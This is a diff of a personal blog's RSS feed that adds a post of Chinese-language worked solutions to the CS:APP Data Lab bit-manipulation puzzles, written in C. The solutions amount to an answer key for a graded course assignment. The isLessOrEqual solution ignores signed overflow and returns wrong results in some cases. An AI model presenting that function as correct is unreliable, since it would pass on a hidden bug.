@@ -6,7 +6,2076 @@
         <description>Recent content on s0uthwood&#39;s Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Tue, 02 Aug 2022 23:23:23 +0800</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Wed, 12 Oct 2022 00:19:32 +0800</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>CSAPP Labs</title>
+        <link>/post/csapp-labs/</link>
+        <pubDate>Wed, 12 Oct 2022 00:19:32 +0800</pubDate>
+        
+        <guid>/post/csapp-labs/</guid>
+        <description>&lt;img src="/post/csapp-labs/cover.jpg" alt="Featured image of post CSAPP Labs" /&gt;&lt;h2 id=&#34;lab1-data-lab&#34;&gt;Lab1 Data-lab&lt;/h2&gt;
+&lt;h3 id=&#34;bitxor&#34;&gt;bitXor&lt;/h3&gt;
+&lt;p&gt;用 &lt;code&gt;~&lt;/code&gt; 和 &lt;code&gt;&amp;amp;&lt;/code&gt; 进行异或运算，简单离散数学&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * bitXor - x^y using only ~ and &amp;amp; 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Example: bitXor(4, 5) = 1
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: ~ &amp;amp;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 14
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 1
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bitXor&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; y) {
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; y) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;(x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;y));
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;tmin&#34;&gt;tmin&lt;/h3&gt;
+&lt;p&gt;要求返回补码中最小的整数&lt;/p&gt;
+&lt;p&gt;众所周知补码形式下最小数为0x80000000，由于使用的常数不能超过 0xff，所以需要使用左移运算生成&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * tmin - return minimum two&amp;#39;s complement integer 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: ! ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 4
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 1
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tmin&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;) {
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;istmax&#34;&gt;isTmax&lt;/h3&gt;
+&lt;p&gt;判断 x 是否为补码格式下的最大数字&lt;/p&gt;
+&lt;p&gt;满足 &lt;code&gt;(~x) ^ (x + 1)&lt;/code&gt; 为 0 的只有 0x7fffffff 和 0xffffffff&lt;/p&gt;
+&lt;p&gt;所以需要再用 &lt;code&gt;!!(~x)&lt;/code&gt; 排除一下 0xffffffff&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/*
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * isTmax - returns 1 if x is the maximum, two&amp;#39;s complement number,
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *     and 0 otherwise 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: ! ~ &amp;amp; ^ | +
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 10
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 1
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isTmax&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x) {
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;((&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;x) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!!&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;x);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;alloddbits&#34;&gt;allOddBits&lt;/h3&gt;
+&lt;p&gt;其实就是返回 &lt;code&gt;x &amp;amp; 0xaaaaaaaa == 0xaaaaaaaa&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;但由于常数不能超过 0xff，所以可以用右移运算来进行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * allOddBits - return 1 if all odd-numbered bits in word set to 1
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   where bits are numbered from 0 (least significant) to 31 (most significant)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: ! ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 12
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 2
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;allOddBits&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x) {
+  x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;=&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;;
+  x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;=&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;((x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAA&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAA&lt;/span&gt;);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;negate&#34;&gt;negate&lt;/h3&gt;
+&lt;p&gt;使用位运算和加法表示 &lt;code&gt;-x&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * negate - return -x 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Example: negate(1) = -1.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: ! ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 5
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 2
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;negate&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x) {
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;isasciidigit&#34;&gt;isAsciiDigit&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;0x30 - 0x39&lt;/code&gt; 之间的数字返回 1&lt;/p&gt;
+&lt;p&gt;根据共同点，先忽略个位，验证是否满足 &lt;code&gt;0x0000003?&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;随后只提取最后一位 &lt;code&gt;x&lt;/code&gt;，判断 &lt;code&gt;x + 6&lt;/code&gt; 后是否超过 &lt;code&gt;0x10&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * isAsciiDigit - return 1 if 0x30 &amp;lt;= x &amp;lt;= 0x39 (ASCII codes for characters &amp;#39;0&amp;#39; to &amp;#39;9&amp;#39;)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Example: isAsciiDigit(0x35) = 1.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *            isAsciiDigit(0x3a) = 0.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *            isAsciiDigit(0x05) = 0.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: ! ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 15
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 3
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isAsciiDigit&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x) {
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;((x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(((x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xf&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;conditional&#34;&gt;conditional&lt;/h3&gt;
+&lt;p&gt;要实现一个三目运算&lt;/p&gt;
+&lt;p&gt;先将 &lt;code&gt;x&lt;/code&gt; 转换为 &lt;code&gt;0&lt;/code&gt; 或 &lt;code&gt;0xffffffff&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;然后再使用位运算进行输出&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;conditional&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; y, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; z) {
+  x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~!&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// if x != 0 -&amp;gt; x = 0
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;               &lt;span style=&#34;color:#75715e&#34;&gt;// if x == 0 -&amp;gt; x = 0xffffffff
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; y) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; z);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;islessorequal&#34;&gt;isLessOrEqual&lt;/h3&gt;
+&lt;p&gt;判断 x 是否小于等于 y&lt;/p&gt;
+&lt;p&gt;判断相减后是否大于 0 即可，用位运算代替减法&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * isLessOrEqual - if x &amp;lt;= y  then return 1, else return 0 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Example: isLessOrEqual(4,5) = 1.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: ! ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 24
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 3
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isLessOrEqual&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; y) {
+  y &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(y &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;logicalneg&#34;&gt;logicalNeg&lt;/h3&gt;
+&lt;p&gt;利用位运算实现 &lt;code&gt;!&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;在int型的右移运算中，正数会在开头补 0，而负数则会在开头补 1&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * logicalNeg - implement the ! operator, using all of 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *              the legal operators except !
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 12
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 4 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;logicalNeg&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x) {
+  &lt;span style=&#34;color:#75715e&#34;&gt;// In right shift, negative number will fixed with 1 at MSB.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (((&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; x) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;howmanybits&#34;&gt;howManyBits&lt;/h3&gt;
+&lt;p&gt;计算多少位可以表示一个数&lt;/p&gt;
+&lt;p&gt;还是利用右移运算进行二分&lt;/p&gt;
+&lt;p&gt;由于需要预留符号位，最后需要 &lt;code&gt;+1&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* howManyBits - return the minimum number of bits required to represent x in
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *             two&amp;#39;s complement
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *  Examples: howManyBits(12) = 5
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *            howManyBits(298) = 10
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *            howManyBits(-5) = 4
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *            howManyBits(0)  = 1
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *            howManyBits(-1) = 1
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *            howManyBits(0x80000000) = 32
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *  Legal ops: ! ~ &amp;amp; ^ | + &amp;lt;&amp;lt; &amp;gt;&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *  Max ops: 90
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *  Rating: 4
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;howManyBits&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x) {
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; sign, b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, cur;
+  sign &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;;
+  sign &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~!&lt;/span&gt;sign &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+  x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;sign) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; sign);
+  cur &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!!&lt;/span&gt;(x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;;
+  x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; cur;
+  b &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; cur;
+  cur &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!!&lt;/span&gt;(x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
+  x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; cur;
+  b &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; cur;
+  cur &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!!&lt;/span&gt;(x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
+  x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; cur;
+  b &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; cur;
+  cur &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!!&lt;/span&gt;(x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+  x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; cur;
+  b &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; cur;
+  cur &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!!&lt;/span&gt;(x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
+  x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; cur;
+  b &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; cur &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; x;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+}
